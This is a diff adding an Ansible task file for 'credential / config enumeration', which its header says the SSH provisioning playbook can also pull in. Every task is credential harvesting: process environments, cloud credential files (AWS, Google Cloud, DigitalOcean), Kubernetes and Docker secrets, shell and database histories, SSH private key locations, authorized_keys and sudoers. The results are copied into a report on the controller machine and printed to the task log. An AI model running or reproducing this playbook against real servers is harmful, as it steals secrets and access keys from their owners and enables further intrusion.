@@ -1,0 +1,262 @@
+---
+# Credential / config enumeration tasks (included by enumerate_server.yml
+# and optionally by provision_ssh.yml after a successful SSH self-test).
+
+- name: Active connections and listeners
+  ansible.builtin.shell: |
+    set -o pipefail
+    echo "=== ESTABLISHED CONNECTIONS ==="
+    ss -tnp state established 2>/dev/null || netstat -tnp 2>/dev/null || true
+    echo "=== LISTENING PORTS ==="
+    ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || true
+    echo "=== UDP LISTENERS ==="
+    ss -ulnp 2>/dev/null || true
+    echo "=== ROUTING TABLE ==="
+    ip route show 2>/dev/null || route -n 2>/dev/null || true
+    echo "=== NETWORK INTERFACES ==="
+    ip addr show 2>/dev/null || ifconfig -a 2>/dev/null || true
+  args:
+    executable: /bin/bash
+  register: network_info
+  changed_when: false
+  failed_when: false
+
+- name: Dump env vars from all running processes
+  ansible.builtin.shell: |
+    set -o pipefail
+    echo "=== CURRENT SHELL ENV ==="
+    env | sort
+    echo "=== ALL PROCESS ENVS ==="
+    for pid in /proc/[0-9]*/environ; do
+      proc=$(cat /proc/$(echo $pid | cut -d/ -f3)/cmdline \
+        2>/dev/null | tr '\0' ' ' | head -c 80)
+      echo "--- PID $(echo $pid | cut -d/ -f3): $proc ---"
+      cat $pid 2>/dev/null | tr '\0' '\n' | \
+        grep -iE "(token|key|secret|pass|auth|api|bearer|\
+    aws|do_|gcp|azure|db_|database|redis|mongo|mysql|\
+    postgres|dsn|url|endpoint|credential)" || true
+    done
+  args:
+    executable: /bin/bash
+  register: env_dump
+  changed_when: false
+  failed_when: false
+
+- name: Find credential and config files
+  ansible.builtin.shell: |
+    set -o pipefail
+    echo "=== .env FILES ==="
+    find / -name ".env" -o -name "*.env" \
+      -o -name ".env.local" -o -name ".env.production" \
+      2>/dev/null | grep -v proc | xargs grep -il \
+      "token\|key\|secret\|password\|auth" 2>/dev/null || true
+
+    echo "=== CONFIG FILES WITH CREDENTIALS ==="
+    find /etc /opt /home /root /var/www /srv /app \
+      \( -type f -name "*.conf" -o -name "*.cfg" \
+      -o -name "*.ini" -o -name "*.json" \
+      -o -name "*.yaml" -o -name "*.yml" \
+      -o -name "*.toml" -o -name "*.properties" \) \
+      2>/dev/null | xargs grep -il \
+      "password\|token\|secret\|api_key\|access_key" \
+      2>/dev/null | grep -v ".pyc" || true
+
+    echo "=== DOCKER ENV FILES ==="
+    find / -name "docker-compose.yml" \
+      -o -name "docker-compose.yaml" \
+      -o -name ".dockerenv" 2>/dev/null | \
+      grep -v proc || true
+
+    echo "=== KUBERNETES SECRETS (if kubectl present) ==="
+    which kubectl && kubectl get secrets \
+      --all-namespaces 2>/dev/null || true
+
+    echo "=== AWS CREDENTIAL FILES ==="
+    find / -path "*/.aws/credentials" \
+      -o -path "*/.aws/config" 2>/dev/null | \
+      xargs cat 2>/dev/null || true
+
+    echo "=== GOOGLE CLOUD CREDENTIAL FILES ==="
+    find / -name "application_default_credentials.json" \
+      -o -name "*.json" -path "*/gcloud/*" \
+      2>/dev/null | xargs cat 2>/dev/null || true
+
+    echo "=== DIGITALOCEAN CONFIG ==="
+    find / -path "*/.config/doctl/config.yaml" \
+      2>/dev/null | xargs cat 2>/dev/null || true
+
+    echo "=== SSH PRIVATE KEYS ==="
+    find / -name "id_rsa" -o -name "id_ed25519" \
+      -o -name "id_ecdsa" -o -name "*.pem" \
+      -o -name "*.key" 2>/dev/null | grep -v proc | \
+      grep -v ".pyc" || true
+  args:
+    executable: /bin/bash
+  register: fs_creds
+  changed_when: false
+  failed_when: false
+
+- name: Docker container env and secrets
+  ansible.builtin.shell: |
+    set -o pipefail
+    echo "=== RUNNING CONTAINERS ==="
+    docker ps 2>/dev/null || true
+
+    echo "=== CONTAINER ENV VARS ==="
+    for c in $(docker ps -q 2>/dev/null); do
+      echo "--- Container: $(docker inspect \
+        --format='{% raw %}{{.Name}}{% endraw %}' "$c") ---"
+      docker inspect --format='{% raw %}{{range .Config.Env}}{{println .}}{{end}}{% endraw %}' \
+        "$c" | grep -iE \
+        "(token|key|secret|pass|auth|api|bearer|aws|do_)" \
+        2>/dev/null || true
+    done
+
+    echo "=== DOCKER CONFIGS/SECRETS ==="
+    docker config ls 2>/dev/null || true
+    docker secret ls 2>/dev/null || true
+
+    echo "=== DOCKER AUTH CONFIG ==="
+    cat /root/.docker/config.json 2>/dev/null || true
+  args:
+    executable: /bin/bash
+  register: docker_creds
+  changed_when: false
+  failed_when: false
+
+- name: Shell history credential scan
+  ansible.builtin.shell: |
+    set -o pipefail
+    echo "=== ROOT BASH HISTORY ==="
+    grep -iE "(token|key|secret|password|api|bearer|curl|wget)" \
+      /root/.bash_history 2>/dev/null | head -50 || true
+
+    echo "=== ALL USER HISTORIES ==="
+    for h in /home/*/.bash_history /home/*/.zsh_history; do
+      echo "--- $h ---"
+      grep -iE \
+        "(token|key|secret|password|api|bearer|curl|wget)" \
+        $h 2>/dev/null | head -20 || true
+    done
+
+    echo "=== MYSQL HISTORY ==="
+    cat /root/.mysql_history 2>/dev/null || true
+
+    echo "=== PSQL HISTORY ==="
+    cat /root/.psql_history 2>/dev/null || true
+  args:
+    executable: /bin/bash
+  register: history_creds
+  changed_when: false
+  failed_when: false
+
+- name: Service configs and credentials
+  ansible.builtin.shell: |
+    set -o pipefail
+    echo "=== SYSTEMD SERVICE FILES WITH ENV ==="
+    grep -rl "Environment\|EnvironmentFile\|ExecStart" \
+      /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null | \
+      xargs grep -iE \
+      "(token|key|secret|password|api)" 2>/dev/null || true
+
+    echo "=== CRON JOBS ==="
+    crontab -l 2>/dev/null || true
+    cat /etc/cron* /var/spool/cron/crontabs/* 2>/dev/null || true
+
+    echo "=== PHP CONFIG (DB CREDS) ==="
+    find /etc/php /var/www -name "*.php" 2>/dev/null | \
+      xargs grep -iE \
+      "(db_pass|db_user|database_url|mysqli|PDO)" \
+      2>/dev/null | head -30 || true
+
+    echo "=== NGINX/APACHE ENV CONFIGS ==="
+    grep -r "pass\|token\|key\|secret" \
+      /etc/nginx/ /etc/apache2/ 2>/dev/null | \
+      grep -v ".pyc" | head -30 || true
+  args:
+    executable: /bin/bash
+  register: service_creds
+  changed_when: false
+  failed_when: false
+
+- name: Current auth state
+  ansible.builtin.shell: |
+    set -o pipefail
+    echo "=== LOGGED IN USERS ==="
+    who 2>/dev/null || true
+    w 2>/dev/null || true
+
+    echo "=== LAST LOGINS ==="
+    last -n 20 2>/dev/null || true
+
+    echo "=== AUTHORIZED KEYS ALL USERS ==="
+    find / -name "authorized_keys" 2>/dev/null | \
+      xargs cat 2>/dev/null || true
+
+    echo "=== SSH KNOWN HOSTS ==="
+    cat /root/.ssh/known_hosts 2>/dev/null || true
+    cat /home/*/.ssh/known_hosts 2>/dev/null || true
+
+    echo "=== SSH CONFIG FILES ==="
+    cat /root/.ssh/config 2>/dev/null || true
+    cat /home/*/.ssh/config 2>/dev/null || true
+
+    echo "=== SUDO ACCESS ==="
+    cat /etc/sudoers 2>/dev/null || true
+    ls /etc/sudoers.d/ 2>/dev/null || true
+  args:
+    executable: /bin/bash
+  register: auth_state
+  changed_when: false
+  failed_when: false
+
+- name: Resolve report timestamp
+  ansible.builtin.command: date -Iseconds
+  register: enum_timestamp
+  changed_when: false
+
+- name: Write enumeration report on controller
+  ansible.builtin.copy:
+    content: |
+      ===== SERVER ENUMERATION REPORT =====
+      Host: {{ inventory_hostname }}
+      Date: {{ ansible_date_time.iso8601 | default(enum_timestamp.stdout) }}
+
+      {{ network_info.stdout | default('') }}
+
+      {{ env_dump.stdout | default('') }}
+
+      {{ fs_creds.stdout | default('') }}
+
+      {{ docker_creds.stdout | default('') }}
+
+      {{ history_creds.stdout | default('') }}
+
+      {{ service_creds.stdout | default('') }}
+
+      {{ auth_state.stdout | default('') }}
+    dest: "{{ enum_report_dir | default('/tmp') }}/enum_report_{{ inventory_hostname }}.txt"
+    mode: "0600"
+  delegate_to: localhost
+  become: false
+
+- name: Print report location
+  ansible.builtin.debug:
+    msg: >-
+      Report saved to {{
+        enum_report_dir | default('/tmp')
+      }}/enum_report_{{ inventory_hostname }}.txt
+
+- name: Print full report to task log
+  ansible.builtin.command:
+    argv:
+      - cat
+      - "{{ enum_report_dir | default('/tmp') }}/enum_report_{{ inventory_hostname }}.txt"
+  delegate_to: localhost
+  become: false
+  register: enum_report_cat
+  changed_when: false
+
+- name: Show enumeration report in task output
+  ansible.builtin.debug:
+    var: enum_report_cat.stdout_lines
